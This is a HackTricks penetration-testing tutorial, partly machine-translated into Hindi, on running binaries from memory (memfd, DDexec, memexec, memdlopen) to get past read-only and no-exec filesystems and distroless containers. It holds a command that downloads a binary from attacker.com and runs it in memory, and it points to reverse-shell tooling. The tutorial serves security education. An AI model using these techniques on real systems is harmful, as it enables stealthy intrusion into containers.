# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Videos

In the following videos you can find the techniques mentioned in this page explained more in depth:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Linux मशीनों में अब अक्सर फाइल सिस्टम को **read-only (ro)** के साथ माउंट किया मिलता है, खासकर containers में। ऐसा इसलिए क्योंकि container को ro फाइल सिस्टम के साथ चलाना उतना ही आसान है जितना कि `securitycontext` में **`readOnlyRootFilesystem: true`** सेट करना:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

हालाँकि, भले ही फाइल सिस्टम ro में माउंट हो, **`/dev/shm`** फिर भी writable रहेगा, तो यह झूठ है कि हम डिस्क पर कुछ भी नहीं लिख सकते। हालाँकि, यह फ़ोल्डर **no-exec protection** के साथ माउंट किया जाएगा, इसलिए अगर आप यहाँ कोई binary डाउनलोड करते हैं तो आप उसे **execute नहीं कर पाएंगे**।

> [!WARNING]
> Red team के दृष्टिकोण से, इससे उन binaries को डाउनलोड और execute करना **जटिल** हो जाता है जो सिस्टम में पहले से मौजूद नहीं हैं (जैसे backdoors या enumerators जैसे `kubectl`)।

## Easiest bypass: Scripts

ध्यान दें कि मैंने binaries का ज़िक्र किया—आप कोई भी script execute कर सकते हैं जब तक कि उस interpreter मशीन के अंदर मौजूद हो, जैसे कि अगर `sh` मौजूद है तो shell script या अगर `python` installed है तो python script।

हालाँकि, यह आपके binary backdoor या अन्य binary tools को चलाने के लिए पर्याप्त नहीं हो सकता।

## Memory Bypasses

अगर आप एक binary execute करना चाहते हैं लेकिन फाइल सिस्टम अनुमति नहीं दे रहा, तो इसका सबसे अच्छा तरीका है कि आप उसे **memory से execute** करें, क्योंकि ये protections memory पर लागू नहीं होते।

### FD + exec syscall bypass

अगर मशीन के अंदर कुछ पावरफुल script engines मौजूद हैं, जैसे **Python**, **Perl**, या **Ruby**, तो आप binary डाउनलोड करके उसे memory में execute करने के लिए डाल सकते हैं, उसे एक memory file descriptor (`create_memfd` syscall) में रख सकते हैं, जो उन protections से प्रभावित नहीं होगा, और फिर एक **`exec` syscall** कॉल कर सकते हैं जिसमें **fd को execute करने वाली फ़ाइल के रूप में** दिया गया हो।

इसके लिए आप आसानी से प्रोजेक्ट [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) का उपयोग कर सकते हैं। आप इसे एक binary दे सकते हैं और यह निर्दिष्ट भाषा में एक script जेनरेट कर देगा जिसमें **binary compressed और b64 encoded** होगा और निर्देश होंगे कि उसे **decode और decompress** कर के `create_memfd` syscall से बनाए गए एक **fd** में कैसे रखना है और फिर उसे चलाने के लिए **exec** syscall कॉल करनी है।

> [!WARNING]
> यह PHP या Node जैसे अन्य scripting languages में काम नहीं करता क्योंकि उनमें किसी script से सीधे raw syscalls कॉल करने का कोई default तरीका नहीं होता, इसलिए `create_memfd` कॉल करके binary को स्टोर करने वाला **memory fd** बनाना संभव नहीं होता।
>
> इसके अलावा, `/dev/shm` में एक regular fd बनाना भी काम नहीं करेगा, क्योंकि आप उसे चलाने की अनुमति नहीं पाएंगे क्योंकि **no-exec protection** लागू होगा।

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) एक तकनीक है जो आपको अपनी प्रक्रिया की memory को modify करने की अनुमति देती है, अपने ही प्रोसेस की **`/proc/self/mem`** को overwrite करके।

इसलिए, जिस assembly code को प्रोसेस execute कर रहा है उसे नियंत्रित करके, आप एक **shellcode** लिख सकते हैं और प्रोसेस को "mutate" कर के किसी भी arbitrary code को execute करवा सकते हैं।

> [!TIP]
> **DDexec / EverythingExec** आपको अपने **shellcode** या किसी भी **binary** को **memory** से load और **execute** करने की अनुमति देता है।
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) DDexec का स्वाभाविक अगला कदम है। यह एक **DDexec shellcode demonised** है, इसलिए जब भी आप **run a different binary** करना चाहें तो आपको DDexec को फिर से लॉन्च करने की ज़रूरत नहीं है; आप बस DDexec तकनीक के माध्यम से memexec shellcode चला सकते हैं और फिर इस deamon के साथ **communicate with this deamon to pass new binaries to load and run** कर सकते हैं।

आप एक उदाहरण देख सकते हैं कि **memexec to execute binaries from a PHP reverse shell** कैसे इस्तेमाल किया जाता है, यहाँ: [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

DDexec के समान उद्देश्य के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) तकनीक मेमोरी में बाइनरीज़ लोड करने का एक **easier way to load binaries** प्रदान करती है ताकि बाद में उन्हें execute किया जा सके। यह डिपेंडेंसी वाले बाइनरीज़ को भी लोड करने की अनुमति दे सकती है।

## Distroless Bypass

For a dedicated explanation of **what distroless actually is**, when it helps, when it does not, and how it changes post-exploitation tradecraft in containers, check:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless containers केवल उस विशिष्ट application या service को चलाने के लिए आवश्यक **bare minimum components necessary to run a specific application or service** ही रखते हैं, जैसे कि लाइब्रेरीज़ और runtime निर्भरताएँ, लेकिन बड़े components जैसे कि package manager, shell, या system utilities को शामिल नहीं करते।

Distroless containers का लक्ष्य अनावश्यक components को हटाकर कंटेनरों के attack surface को कम करना और संभावित vulnerabilities की संख्या घटाना है।

### Reverse Shell

एक distroless container में आपको एक regular shell पाने के लिये शायद `sh` या `bash` भी नहीं मिलें। आपको उन बाइनरीज़ जैसे `ls`, `whoami`, `id` भी नहीं मिलेंगे... वो सब कुछ जो आप आमतौर पर सिस्टम में चलाते हैं।

> [!WARNING]
> इसलिए, आप सामान्य तरीके से एक **reverse shell** प्राप्त करने या सिस्टम को **enumerate** करने में सक्षम नहीं होंगे।

हालाँकि, अगर compromised container उदाहरण के लिए एक flask web चला रहा है, तो वहाँ python installed होगा, और आप एक **Python reverse shell** प्राप्त कर सकते हैं। अगर यह node चला रहा है, तो आप Node rev shell प्राप्त कर सकते हैं, और अधिकतर किसी भी **scripting language** के साथ भी यही लागू होता है।

> [!TIP]
> scripting language का उपयोग करके आप भाषा की क्षमताओं का उपयोग कर के सिस्टम को **enumerate the system** कर सकते हैं।

यदि वहाँ **no `read-only/no-exec`** protections हैं तो आप अपने reverse shell का दुरुपयोग कर के फाइल सिस्टम में अपने बाइनरीज़ **write in the file system your binaries** कर सकते हैं और उन्हें **execute** कर सकते हैं।

> [!TIP]
> हालांकि, इस तरह के containers में ये protections आमतौर पर मौजूद होंगे, लेकिन आप उन्हें bypass करने के लिए **previous memory execution techniques to bypass them** का उपयोग कर सकते हैं।

आप उदाहरण पा सकते हैं कि कैसे कुछ RCE vulnerabilities का exploit कर के scripting languages की **reverse shells** प्राप्त की जा सकती हैं और मेमोरी से बाइनरीज़ execute की जा सकती हैं यहाँ: [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
